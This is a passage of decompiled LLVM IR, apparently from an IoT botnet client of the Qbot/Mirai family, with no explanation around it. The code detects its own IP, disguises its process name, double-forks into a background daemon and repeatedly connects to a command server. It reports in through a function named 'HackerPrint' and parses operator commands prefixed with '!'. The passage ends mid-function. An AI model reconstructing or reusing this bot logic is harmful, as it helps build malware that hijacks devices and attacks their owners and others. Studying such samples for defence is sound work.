  %v2_12da8 = icmp eq i32 %v2_12da4, 0
  br i1 %v2_12da8, label %dec_label_pc_12dd4, label %dec_label_pc_12dc0

dec_label_pc_12dc0:                               ; preds = %dec_label_pc_12da0
  %v1_12dc8 = add i32 %v2_12da4, 1
  br label %dec_label_pc_12dd4

dec_label_pc_12dd4:                               ; preds = %dec_label_pc_12da0, %dec_label_pc_12dc0
  %storemerge1 = phi i32 [ %v1_12dc8, %dec_label_pc_12dc0 ], [ 0, %dec_label_pc_12da0 ]
  store i32 %storemerge1, i32* @global_var_2c278.819, align 4
  %v4_12dec = mul i32 %storemerge1, 4
  %v5_12dec = add i32 %v4_12dec, ptrtoint ([16 x i8]** @global_var_2c1e0.822 to i32)
  %v6_12dec = inttoptr i32 %v5_12dec to i32*
  %v7_12dec = load i32, i32* %v6_12dec, align 4
  store i32 %v7_12dec, i32* @r1, align 4
  %v3_12df8 = call i32 @strcpy(i8* %v2_12d70, i32 %v7_12dec)
  %v2_12e00 = load i32, i32* @global_var_2c1e4.824, align 4
  store i32 %v2_12d60, i32* @r0, align 4
  %v2_12e1c = call i32 @__GI_strchr(i32 %v2_12d60, i32 58)
  %v2_12e24 = icmp eq i32 %v2_12e1c, 0
  br i1 %v2_12e24, label %dec_label_pc_12e84, label %dec_label_pc_12e2c

dec_label_pc_12e2c:                               ; preds = %dec_label_pc_12dd4
  store i32 %v2_12d60, i32* @r0, align 4
  %v2_12e40 = call i32 @__GI_strchr(i32 %v2_12d60, i32 58)
  %v1_12e48 = add i32 %v2_12e40, 1
  store i32 %v1_12e48, i32* @r0, align 4
  %v1_12e50 = call i32 @atol(i32 %v1_12e48)
  store i32 %v2_12d60, i32* @r0, align 4
  %v2_12e70 = call i32 @__GI_strchr(i32 %v2_12d60, i32 58)
  %v3_12e80 = inttoptr i32 %v2_12e70 to i8*
  store i8 0, i8* %v3_12e80, align 1
  br label %dec_label_pc_12e84

dec_label_pc_12e84:                               ; preds = %dec_label_pc_12dd4, %dec_label_pc_12e2c
  %stack_var_-20.0 = phi i32 [ %v2_12e00, %dec_label_pc_12dd4 ], [ %v1_12e50, %dec_label_pc_12e2c ]
  %v3_12e90 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_12e90, i32* @global_var_2c5e8.50, align 4
  %v4_12ec4 = call i32 @connectTimeout(i32 %v3_12e90, i32 %v2_12d60, i32 %stack_var_-20.0, i32 30)
  %v2_12ecc = icmp eq i32 %v4_12ec4, 0
  %. = zext i1 %v2_12ecc to i32
  store i32 %v3_12d48, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_12d60, { 4, 1, 0, 3, 2, 6, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_12e84, { 1, 0 }
  uselistorder label %dec_label_pc_12dd4, { 1, 0 }
  uselistorder label %dec_label_pc_12da0, { 1, 0 }
}

define i32 @getOurIP(i32 %arg1) local_unnamed_addr {
entry:
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12f1c = load i32, i32* @fp, align 4
  store i32 %v3_12f1c, i32* %stack_var_-16, align 4
  %v3_12f38 = call i32 @socket(i32 2, i32 2, i32 0)
  %v3_12f48 = icmp eq i32 %v3_12f38, -1
  br i1 %v3_12f48, label %dec_label_pc_12f50, label %dec_label_pc_12f60

dec_label_pc_12f50:                               ; preds = %entry
  br label %dec_label_pc_1319c

dec_label_pc_12f60:                               ; preds = %entry
  %v2_12f60 = ptrtoint i32* %stack_var_-52 to i32
  store i32 16, i32* @r2, align 4
  %v2_12f70 = bitcast i32* %stack_var_-52 to i8*
  %v3_12f70 = call i32 @__GI_memset(i8* %v2_12f70, i32 0)
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_228e8.826 to i32), i32* @r0, align 4
  %v2_12f80 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_228e8.826 to i32))
  %v1_12f90 = call i32 @__GI_htons(i32 53)
  %v3_12fac = call i32 @__libc_connect(i32 %v3_12f38, i32 %v2_12f60, i32 16)
  %v3_12fbc = icmp eq i32 %v3_12fac, -1
  br i1 %v3_12fbc, label %dec_label_pc_12fc4, label %dec_label_pc_12fd4

dec_label_pc_12fc4:                               ; preds = %dec_label_pc_12f60
  br label %dec_label_pc_1319c

dec_label_pc_12fd4:                               ; preds = %dec_label_pc_12f60
  store i32 16, i32* %stack_var_-72, align 4
  %v2_12fdc = ptrtoint i32* %stack_var_-68 to i32
  %v2_12fe0 = ptrtoint i32* %stack_var_-72 to i32
  %v5_12fec = call i32 @__GI_getsockname(i32 %v3_12f38, i32 %v2_12fdc, i32 %v2_12fe0, i32 %v2_12fdc, i32 16)
  %v3_12ffc = icmp eq i32 %v5_12fec, -1
  br i1 %v3_12ffc, label %dec_label_pc_13004, label %dec_label_pc_13014

dec_label_pc_13004:                               ; preds = %dec_label_pc_12fd4
  br label %dec_label_pc_1319c

dec_label_pc_13014:                               ; preds = %dec_label_pc_12fd4
  store i32 %tmp19, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_32844.478 to i32), i32* @r2, align 4
  store i32 %tmp19, i32* @global_var_32844.478, align 4
  %v3_13028 = call i32 @__GI_open(i32 ptrtoint ([16 x i8]* @global_var_228f0.829 to i32), i32 0)
  %v2_130c0 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_130b8

dec_label_pc_13038:                               ; preds = %dec_label_pc_130b8
  %v4_1304c = call i32 @strstr(i32 %v2_130c0, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_22900.831, i32 0, i32 0))
  %v2_13054 = icmp eq i32 %v4_1304c, 0
  br i1 %v2_13054, label %dec_label_pc_1309c, label %dec_label_pc_1307c.preheader

dec_label_pc_1307c.preheader:                     ; preds = %dec_label_pc_13038
  %v2_130809 = load i8, i8* %stack_var_-4168, align 1
  %v7_1308413 = icmp eq i8 %v2_130809, 9
  br i1 %v7_1308413, label %dec_label_pc_1308c, label %dec_label_pc_13070

dec_label_pc_13070:                               ; preds = %dec_label_pc_1307c.preheader, %dec_label_pc_13070
  %v4_1307c14 = phi i32 [ %v1_13074, %dec_label_pc_13070 ], [ %v2_130c0, %dec_label_pc_1307c.preheader ]
  %v1_13074 = add i32 %v4_1307c14, 1
  %v5_13078 = inttoptr i32 %v1_13074 to i8*
  %v2_13080 = load i8, i8* %v5_13078, align 1
  %v7_13084 = icmp eq i8 %v2_13080, 9
  br i1 %v7_13084, label %dec_label_pc_1308c, label %dec_label_pc_13070

dec_label_pc_1308c:                               ; preds = %dec_label_pc_13070, %dec_label_pc_1307c.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_1307c.preheader ], [ %v5_13078, %dec_label_pc_13070 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_130e0

dec_label_pc_1309c:                               ; preds = %dec_label_pc_13038
  store i32 4096, i32* @r2, align 4
  %v3_130b4 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_130b8

dec_label_pc_130b8:                               ; preds = %dec_label_pc_13014, %dec_label_pc_1309c
  %v4_130d0 = call i32 @fdgets(i32 %v2_130c0, i32 4096, i32 %v3_13028, i32 %v2_130c0)
  %v2_130d8 = icmp eq i32 %v4_130d0, 0
  br i1 %v2_130d8, label %dec_label_pc_130e0, label %dec_label_pc_13038

dec_label_pc_130e0:                               ; preds = %dec_label_pc_130b8, %dec_label_pc_1308c
  %v1_130e4 = call i32 @__GI_close(i32 %v3_13028)
  %v4_130f4 = load i8, i8* %stack_var_-4168, align 1
  %v2_130f8 = icmp eq i8 %v4_130f4, 0
  br i1 %v2_130f8, label %dec_label_pc_13190, label %dec_label_pc_13100

dec_label_pc_13100:                               ; preds = %dec_label_pc_130e0
  %v2_13108 = ptrtoint i32* %stack_var_-4200 to i32
  store i32 %v2_130c0, i32* @r1, align 4
  %v2_13120 = bitcast i32* %stack_var_-4200 to i8*
  %v3_13120 = call i32 @strcpy(i8* %v2_13120, i32 %v2_130c0)
  store i32 %v2_13108, i32* @r3, align 4
  %v3_13140 = call i32 @ioctl(i32 %v3_12f38, i32 35111, i32 %v2_13108)
  %v2_13160 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_13150

dec_label_pc_13150:                               ; preds = %dec_label_pc_13100, %dec_label_pc_13150
  %storemerge47 = phi i32 [ 0, %dec_label_pc_13100 ], [ %v1_1317c, %dec_label_pc_13150 ]
  %v2_13168 = add i32 %storemerge47, %v2_13160
  %v1_1316c = inttoptr i32 %v2_13168 to i8*
  %v2_1316c = load i8, i8* %v1_1316c, align 1
  %v4_13174 = add i32 %storemerge47, ptrtoint (i32* @global_var_2c5f8.833 to i32)
  %v5_13174 = inttoptr i32 %v4_13174 to i8*
  store i8 %v2_1316c, i8* %v5_13174, align 1
  %v1_1317c = add nuw nsw i32 %storemerge47, 1
  %v7_1318c = icmp slt i32 %v1_1317c, 6
  br i1 %v7_1318c, label %dec_label_pc_13150, label %dec_label_pc_13190

dec_label_pc_13190:                               ; preds = %dec_label_pc_13150, %dec_label_pc_130e0
  %v1_13194 = call i32 @__GI_close(i32 %v3_12f38)
  %v3_131b0.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_131ac

dec_label_pc_1319c:                               ; preds = %dec_label_pc_13004, %dec_label_pc_12fc4, %dec_label_pc_12f50
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_131ac

dec_label_pc_131ac:                               ; preds = %dec_label_pc_13190, %dec_label_pc_1319c
  %v3_131b0 = phi i32 [ %v3_131b0.pre, %dec_label_pc_13190 ], [ 0, %dec_label_pc_1319c ]
  %v2_131b8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_131b8, i32* @fp, align 4
  ret i32 %v3_131b0

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_13074, { 1, 0 }
  uselistorder i32 %v2_130c0, { 2, 1, 3, 5, 0, 4 }
  uselistorder i32 %v3_12f38, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 4, 2, 0, 1, 3 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_htons, { 14, 13, 12, 11, 4, 3, 2, 1, 0, 10, 9, 8, 15, 7, 6, 5 }
  uselistorder i32 (i32)* @inet_addr, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_131ac, { 1, 0 }
  uselistorder label %dec_label_pc_13150, { 1, 0 }
  uselistorder label %dec_label_pc_130b8, { 1, 0 }
  uselistorder label %dec_label_pc_13070, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %v3_131ec = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_2290c.835 to i32), i32 0)
  %v7_131f4 = icmp eq i32 %v3_131ec, -1
  %v4_13210 = select i1 %v7_131f4, i32 ptrtoint ([7 x i8]* @global_var_22924.839 to i32), i32 ptrtoint ([7 x i8]* @global_var_2291c.837 to i32)
  ret i32 %v4_13210
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-1156 = alloca i32, align 4
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13234 = load i32, i32* @r4, align 4
  store i32 %v3_13234, i32* %stack_var_-24, align 4
  store i32 78396, i32* %stack_var_-4, align 4
  %v19_13234 = ptrtoint i32* %stack_var_-24 to i32
  %v2_13238 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_13238, i32* @fp, align 4
  %v3_13274 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_2290c.835 to i32), i32 0)
  store i32 %v3_13274, i32* @r0, align 4
  %v7_1327c = icmp eq i32 %v3_13274, -1
  %. = select i1 %v7_1327c, i32 ptrtoint ([19 x i8]* @global_var_22938.846 to i32), i32 ptrtoint ([5 x i8]* @global_var_22930.844 to i32)
  %v0_13298 = call i32 @geteuid()
  %v2_132a0 = icmp eq i32 %v0_13298, 0
  br i1 %v2_132a0, label %dec_label_pc_132a8, label %dec_label_pc_132b4

dec_label_pc_132a8:                               ; preds = %entry
  store i32 0, i32* @global_var_2c274.848, align 4
  br label %dec_label_pc_132b4

dec_label_pc_132b4:                               ; preds = %entry, %dec_label_pc_132a8
  %v0_132b4 = call i32 @getBuild()
  %v0_132c0 = call i32 @getBuild()
  store i32 %v0_132c0, i32* @r4, align 4
  %v2_132cc = load i32, i32* @global_var_32844.478, align 4
  store i32 %v2_132cc, i32* @r0, align 4
  %v1_132d0 = call i32 @__GI_inet_ntoa(i32 %v2_132cc)
  %v0_132dc = load i32, i32* @r4, align 4
  %v1_132dc = inttoptr i32 %v0_132dc to i8*
  %v1_132e0 = inttoptr i32 %v1_132d0 to i8*
  %v9_132e4 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_2294c.851, i32 0, i32 0), i8* %v1_132dc, i8* %v1_132e0)
  %v1_132f8 = bitcast i8** %argv to i32*
  %v2_132f8 = load i32, i32* %v1_132f8, align 4
  store i32 %v2_132f8, i32* @r4, align 4
  %v2_13310 = load i32, i32* %v1_132f8, align 4
  %v1_13314 = inttoptr i32 %v2_13310 to i8*
  %v3_13318 = call i32 @strlen(i8* %v1_13314)
  %v0_13320 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2292c.841 to i32), i32* @r1, align 4
  %v3_1332c = call i32 @strncpy(i32 %v0_13320, i32 ptrtoint (i32* @global_var_2292c.841 to i32), i32 %v3_13318)
  %v2_13340 = load i32, i32* %v1_132f8, align 4
  store i32 %v2_13340, i32* @r0, align 4
  %v2_1334c = call i32 @sprintf(i32 %v2_13340, i32 %.)
  %v6_13370 = call i32 @prctl(i32 15, i32 %., i32 0, i32 0, i32 0)
  %v2_13378 = call i32 @__GI_time(i32* null)
  store i32 %v2_13378, i32* @r0, align 4
  store i32 %v2_13378, i32* @r4, align 4
  %v0_13380 = call i32 @__GI_getpid()
  %v0_13388 = load i32, i32* @r4, align 4
  %v2_13388 = xor i32 %v0_13388, %v0_13380
  %v1_13390 = call i32 @srand(i32 %v2_13388)
  %v2_13398 = call i32 @__GI_time(i32* null)
  store i32 %v2_13398, i32* @r0, align 4
  store i32 %v2_13398, i32* @r4, align 4
  %v0_133a0 = call i32 @__GI_getpid()
  %v0_133a8 = load i32, i32* @r4, align 4
  %v2_133a8 = xor i32 %v0_133a8, %v0_133a0
  %v1_133b0 = call i32 @init_rand(i32 %v2_133a8)
  %v1_133b4 = call i32 @getOurIP(i32 %v1_133b0)
  store i32 %v1_133b4, i32* @r0, align 4
  %v0_133b8 = call i32 @__libc_fork()
  store i32 %v0_133b8, i32* @r0, align 4
  %v2_133c8 = icmp eq i32 %v0_133b8, 0
  br i1 %v2_133c8, label %dec_label_pc_133f8, label %dec_label_pc_133ec

dec_label_pc_133ec:                               ; preds = %dec_label_pc_132b4
  %v2_133d0 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v0_133b8, i32* @r0, align 4
  store i32 %v2_133d0, i32* @r1, align 4
  %v3_133e0 = call i32 @__libc_waitpid(i32 %v0_133b8, i32 %v2_133d0, i32 0)
  %v1_133e8 = call i32 @__GI_exit(i32 0)
  store i32 %v1_133e8, i32* @r0, align 4
  br label %dec_label_pc_13418

dec_label_pc_133f8:                               ; preds = %dec_label_pc_132b4
  %v0_133f8 = call i32 @__libc_fork()
  store i32 %v0_133f8, i32* @r0, align 4
  %v2_13408 = icmp eq i32 %v0_133f8, 0
  br i1 %v2_13408, label %dec_label_pc_13418, label %dec_label_pc_13410

dec_label_pc_13410:                               ; preds = %dec_label_pc_133f8
  %v1_13414 = call i32 @__GI_exit(i32 0)
  store i32 %v1_13414, i32* @r0, align 4
  br label %dec_label_pc_13418

dec_label_pc_13418:                               ; preds = %dec_label_pc_133ec, %dec_label_pc_133f8, %dec_label_pc_13410
  %v0_13418 = call i32 @__GI_setsid()
  %v1_13420 = call i32 @chdir(i32 ptrtoint (i32* @global_var_2295c.853 to i32))
  %v2_1342c = call i32 @bsd_signal(i32 13, i32 1)
  %v2_13c78 = ptrtoint i32* %stack_var_-5252 to i32
  %v4_13c88 = bitcast i32* %stack_var_-5252 to i8*
  %v1_138a8 = or i32 %v2_13c78, 1
  %v5_138ac = inttoptr i32 %v1_138a8 to i8*
  %v2_13a18 = ptrtoint i32* %stack_var_-1156 to i32
  %v2_13a28 = bitcast i32* %stack_var_-1156 to i8*
  %v2_13c38 = add i32 %v19_13234, -108
  br label %dec_label_pc_13430

dec_label_pc_13430:                               ; preds = %dec_label_pc_13440, %dec_label_pc_13c68, %dec_label_pc_13418
  %v0_13430 = call i32 @initConnection()
  %v2_13438 = icmp eq i32 %v0_13430, 0
  br i1 %v2_13438, label %dec_label_pc_1344c, label %dec_label_pc_13440

dec_label_pc_13440:                               ; preds = %dec_label_pc_13430
  %v1_13444 = call i32 @sleep(i32 5)
  br label %dec_label_pc_13430

dec_label_pc_1344c:                               ; preds = %dec_label_pc_13430
  %v2_13450 = load i32, i32* @global_var_2c5e8.50, align 4
  store i32 %v2_13450, i32* @r4, align 4
  %v2_13458 = load i32, i32* @global_var_32844.478, align 4
  store i32 %v2_13458, i32* @r0, align 4
  %v1_1345c = call i32 @__GI_inet_ntoa(i32 %v2_13458)
  store i32 %v1_1345c, i32* @r5, align 4
  %v0_13464 = call i32 @getBuild()
  %v0_13474 = load i32, i32* @r4, align 4
  %v0_1347c = load i32, i32* @r5, align 4
  store i32 %v0_1347c, i32* @r2, align 4
  %v2_13484 = call i32 @HackerPrint(i32 %v0_13474, i32 ptrtoint (i32* @global_var_22960.858 to i32))
  br label %dec_label_pc_13c68

dec_label_pc_134a8:                               ; preds = %dec_label_pc_13760, %dec_label_pc_13704
  %v3_134ac = mul i32 %storemerge14, 4
  %v2_134b8 = load i32, i32* @global_var_32850.59, align 4
  %v2_134bc = add i32 %v2_134b8, %v3_134ac
  %v1_134c0 = inttoptr i32 %v2_134bc to i32*
  %v2_134c0 = load i32, i32* %v1_134c0, align 4
  store i32 %v2_134c0, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v3_134d0 = call i32 @__libc_waitpid(i32 %v2_134c0, i32 0, i32 1)
  %tmp102 = icmp slt i32 %v3_134d0, 1
  br i1 %tmp102, label %dec_label_pc_136f8, label %dec_label_pc_13534

dec_label_pc_134f0:                               ; preds = %dec_label_pc_13534, %dec_label_pc_1358c
  %v2_134f4 = load i32, i32* @global_var_32850.59, align 4
  %v3_13500 = mul i32 %v1_134e4, 4
  %v1_134f8 = add i32 %v3_13500, -4
  %v2_13504 = add i32 %v1_134f8, %v2_134f4
  %v2_1351c = add i32 %v2_134f4, %v3_13500
  %v1_13520 = inttoptr i32 %v2_1351c to i32*
  %v2_13520 = load i32, i32* %v1_13520, align 4
  %v2_13524 = inttoptr i32 %v2_13504 to i32*
  store i32 %v2_13520, i32* %v2_13524, align 4
  br label %dec_label_pc_13534

dec_label_pc_13534:                               ; preds = %dec_label_pc_134a8, %dec_label_pc_134f0
  %v3_134e0.sink = phi i32 [ %v1_134e4, %dec_label_pc_134f0 ], [ %storemerge14, %dec_label_pc_134a8 ]
  %v1_134e4 = add i32 %v3_134e0.sink, 1
  %v2_1354c = load i32, i32* @global_var_2c5f0.56, align 4
  %v9_1356c = icmp eq i32 %v2_1354c, 0
  br i1 %v9_1356c, label %dec_label_pc_1358c, label %dec_label_pc_134f0

dec_label_pc_1358c:                               ; preds = %dec_label_pc_13534
  %v5_1354c = load i32, i32* @global_var_2c5f4.57, align 4
  %tmp103 = icmp ugt i32 %v5_1354c, %v1_134e4
  br i1 %tmp103, label %dec_label_pc_134f0, label %dec_label_pc_135a4

dec_label_pc_135a4:                               ; preds = %dec_label_pc_1358c
  %v2_135a8 = load i32, i32* @global_var_32850.59, align 4
  %v3_135b4 = mul i32 %v1_134e4, 4
  %v1_135ac = add i32 %v3_135b4, -4
  %v2_135b8 = add i32 %v1_135ac, %v2_135a8
  %v2_135c0 = inttoptr i32 %v2_135b8 to i32*
  store i32 0, i32* %v2_135c0, align 4
  %v2_135c8 = load i32, i32* @global_var_2c5f0.56, align 4
  %v5_135c8 = load i32, i32* @global_var_2c5f4.57, align 4
  %v2_135d4 = add i32 %v2_135c8, -1
  %v3_135d4 = icmp ne i32 %v2_135c8, 0
  %v3_135d8 = add i32 %v5_135c8, -1
  %v4_135d8 = zext i1 %v3_135d4 to i32
  %v5_135d8 = add i32 %v3_135d8, %v4_135d8
  store i32 %v2_135d4, i32* @global_var_2c5f0.56, align 4
  store i32 %v5_135d8, i32* @global_var_2c5f4.57, align 4
  %v3_135f4 = icmp eq i32 %v2_135c8, 0
  %v4_135f8 = zext i1 %v3_135f4 to i32
  %v5_135f8 = add i32 %v5_135d8, %v4_135f8
  %v3_135fc = udiv i32 %v2_135c8, 1073741824
  %v3_13600 = mul i32 %v5_135f8, 4
  %v2_13604 = or i32 %v3_13600, %v3_135fc
  store i32 %v2_13604, i32* @r4, align 4
  %v3_13608 = mul i32 %v2_135c8, 4
  %v1_13610 = call i32 @malloc(i32 %v3_13608)
  br label %dec_label_pc_13668

dec_label_pc_13628:                               ; preds = %dec_label_pc_13668, %dec_label_pc_136c4
  %v3_1362c = mul i32 %storemerge19, 4
  %v2_13638 = add i32 %v3_1362c, %v1_13610
  %v2_1364c = load i32, i32* @global_var_32850.59, align 4
  %v2_13650 = add i32 %v2_1364c, %v3_1362c
  %v1_13654 = inttoptr i32 %v2_13650 to i32*
  %v2_13654 = load i32, i32* %v1_13654, align 4
  %v2_13658 = inttoptr i32 %v2_13638 to i32*
  store i32 %v2_13654, i32* %v2_13658, align 4
  %v1_13660 = add i32 %storemerge19, 1
  br label %dec_label_pc_13668

dec_label_pc_13668:                               ; preds = %dec_label_pc_135a4, %dec_label_pc_13628
  %storemerge19 = phi i32 [ 0, %dec_label_pc_135a4 ], [ %v1_13660, %dec_label_pc_13628 ]
  %v2_13684 = load i32, i32* @global_var_2c5f0.56, align 4
  %v9_136a4 = icmp eq i32 %v2_13684, 0
  br i1 %v9_136a4, label %dec_label_pc_136c4, label %dec_label_pc_13628

dec_label_pc_136c4:                               ; preds = %dec_label_pc_13668
  %v5_13684 = load i32, i32* @global_var_2c5f4.57, align 4
  %tmp = icmp ugt i32 %v5_13684, %storemerge19
  br i1 %tmp, label %dec_label_pc_13628, label %dec_label_pc_136dc

dec_label_pc_136dc:                               ; preds = %dec_label_pc_136c4
  %v2_136e0 = load i32, i32* @global_var_32850.59, align 4
  store i32 %v2_136e0, i32* @r0, align 4
  %v0_136e8 = call i32 @free()
  store i32 %v1_13610, i32* @global_var_32850.59, align 4
  br label %dec_label_pc_136f8

dec_label_pc_136f8:                               ; preds = %dec_label_pc_134a8, %dec_label_pc_136dc
  %v1_136fc = add i32 %storemerge14, 1
  br label %dec_label_pc_13704

dec_label_pc_13704:                               ; preds = %dec_label_pc_13c68, %dec_label_pc_136f8
  %storemerge14 = phi i32 [ %v1_136fc, %dec_label_pc_136f8 ], [ 0, %dec_label_pc_13c68 ]
  %v3_1370c = ashr i32 %storemerge14, 31
  %v2_13720 = load i32, i32* @global_var_2c5f0.56, align 4
  %v5_13720 = load i32, i32* @global_var_2c5f4.57, align 4
  %v3_13740 = icmp uge i32 %v2_13720, %v3_1370c
  %v9_13740 = icmp eq i32 %v2_13720, %v3_1370c
  %v2_13744 = xor i1 %v9_13740, true
  %v3_13744 = and i1 %v3_13740, %v2_13744
  br i1 %v3_13744, label %dec_label_pc_134a8, label %dec_label_pc_13748

dec_label_pc_13748:                               ; preds = %dec_label_pc_13704
  br i1 %v9_13740, label %dec_label_pc_13760, label %dec_label_pc_13778

dec_label_pc_13760:                               ; preds = %dec_label_pc_13748
  %tmp117 = icmp ugt i32 %v5_13720, %storemerge14
  br i1 %tmp117, label %dec_label_pc_134a8, label %dec_label_pc_13778

dec_label_pc_13778:                               ; preds = %dec_label_pc_13748, %dec_label_pc_13760
  %v2_1378c = add i32 %v5_13c88, %v2_13c78
  %v3_13794 = inttoptr i32 %v2_1378c to i8*
  store i8 0, i8* %v3_13794, align 1
  %v2_137a8 = call i32 @trim(i8* %v4_13c88)
  %v4_137c0 = call i32 @strstr(i32 %v2_13c78, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1fda4.52, i32 0, i32 0))
  store i32 %v4_137c0, i32* @r2, align 4
  %v9_137d4 = icmp eq i32 %v4_137c0, %v2_13c78
  br i1 %v9_137d4, label %dec_label_pc_137dc, label %dec_label_pc_137f4

dec_label_pc_137dc:                               ; preds = %dec_label_pc_13778
  %v2_137e0 = load i32, i32* @global_var_2c5e8.50, align 4
  %v3_137ec = call i32 @HackerPrint(i32 %v2_137e0, i32 ptrtoint ([5 x i8]* @global_var_229ac.863 to i32))
  br label %dec_label_pc_13c68

dec_label_pc_137f4:                               ; preds = %dec_label_pc_13778
  %v6_13808 = call i32 @strstr(i32 %v2_13c78, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_229b4.865, i32 0, i32 0))
  %v9_1381c = icmp eq i32 %v6_13808, %v2_13c78
  br i1 %v9_1381c, label %dec_label_pc_13824, label %dec_label_pc_1382c

dec_label_pc_13824:                               ; preds = %dec_label_pc_137f4
  %v1_13828 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_1382c

dec_label_pc_1382c:                               ; preds = %dec_label_pc_137f4, %dec_label_pc_13824
  %v2_13840 = load i8, i8* %v4_13c88, align 4
  %v7_13844 = icmp eq i8 %v2_13840, 33
  br i1 %v7_13844, label %dec_label_pc_13868, label %dec_label_pc_13c68

dec_label_pc_13868:                               ; preds = %dec_label_pc_1382c, %dec_label_pc_13878
  %v3_1384c.sink = phi i8* [ %storemerge8, %dec_label_pc_13878 ], [ %v4_13c88, %dec_label_pc_1382c ]
  %v4_1384c = ptrtoint i8* %v3_1384c.sink to i32
  %v1_13850 = add i32 %v4_1384c, 1
  %storemerge8 = inttoptr i32 %v1_13850 to i8*
  %v2_1386c = load i8, i8* %storemerge8, align 1
  %v7_13870 = icmp eq i8 %v2_1386c, 32
  br i1 %v7_13870, label %dec_label_pc_13888, label %dec_label_pc_13878

dec_label_pc_13878:                               ; preds = %dec_label_pc_13868
  %v2_1387c = load i8, i8* %storemerge8, align 1
  %v2_13880 = icmp eq i8 %v2_1387c, 0
  br i1 %v2_13880, label %dec_label_pc_13888, label %dec_label_pc_13868

dec_label_pc_13888:                               ; preds = %dec_label_pc_13878, %dec_label_pc_13868
  %v2_1388c = load i8, i8* %storemerge8, align 1
  %v2_13890 = icmp eq i8 %v2_1388c, 0
  br i1 %v2_13890, label %dec_label_pc_13c68, label %dec_label_pc_13898

dec_label_pc_13898:                               ; preds = %dec_label_pc_13888
  store i8 0, i8* %storemerge8, align 1
  %v3_138b8 = call i32 @strlen(i8* %v5_138ac)
  %v2_138c8 = add i32 %v3_138b8, %v2_13c78
  %v1_138cc = add i32 %v2_138c8, 2
  %v5_138d0 = inttoptr i32 %v1_138cc to i8*
  %v1_13900 = add i32 %v2_138c8, 1
  br label %dec_label_pc_138fc

dec_label_pc_138d8:                               ; preds = %dec_label_pc_13924, %dec_label_pc_138fc
  %v3_138e8 = call i32 @strlen(i8* %v5_138d0)
  %v2_138f0 = add i32 %v1_13900, %v3_138e8
  %v3_138f8 = inttoptr i32 %v2_138f0 to i8*
  store i8 0, i8* %v3_138f8, align 1
  br label %dec_label_pc_138fc

dec_label_pc_138fc:                               ; preds = %dec_label_pc_13898, %dec_label_pc_138d8
  %v3_1390c = call i32 @strlen(i8* %v5_138d0)
  %v2_13914 = add i32 %v1_13900, %v3_1390c
  %v1_13918 = inttoptr i32 %v2_13914 to i8*
  %v2_13918 = load i8, i8* %v1_13918, align 1
  %v7_1391c = icmp eq i8 %v2_13918, 10
  br i1 %v7_1391c, label %dec_label_pc_138d8, label %dec_label_pc_13924

dec_label_pc_13924:                               ; preds = %dec_label_pc_138fc
  store i32 %v1_13900, i32* @r4, align 4
  %v3_13934 = call i32 @strlen(i8* %v5_138d0)
  %v0_1393c = load i32, i32* @r4, align 4
  %v2_1393c = add i32 %v0_1393c, %v3_13934
  %v1_13940 = inttoptr i32 %v2_1393c to i8*
  %v2_13940 = load i8, i8* %v1_13940, align 1
  %v7_13944 = icmp eq i8 %v2_13940, 13
  br i1 %v7_13944, label %dec_label_pc_138d8, label %dec_label_pc_1394c

dec_label_pc_1394c:                               ; preds = %dec_label_pc_13924
  %v2_1396821 = load i8, i8* %v5_138d0, align 1
  %v7_1396c25 = icmp eq i8 %v2_1396821, 32
  br i1 %v7_1396c25, label %dec_label_pc_13984, label %dec_label_pc_13974

dec_label_pc_13958:                               ; preds = %dec_label_pc_13974
  %v1_1395c = add i32 %v4_1396427, 1
  %v5_13960 = inttoptr i32 %v1_1395c to i8*
  %v2_13968 = load i8, i8* %v5_13960, align 1
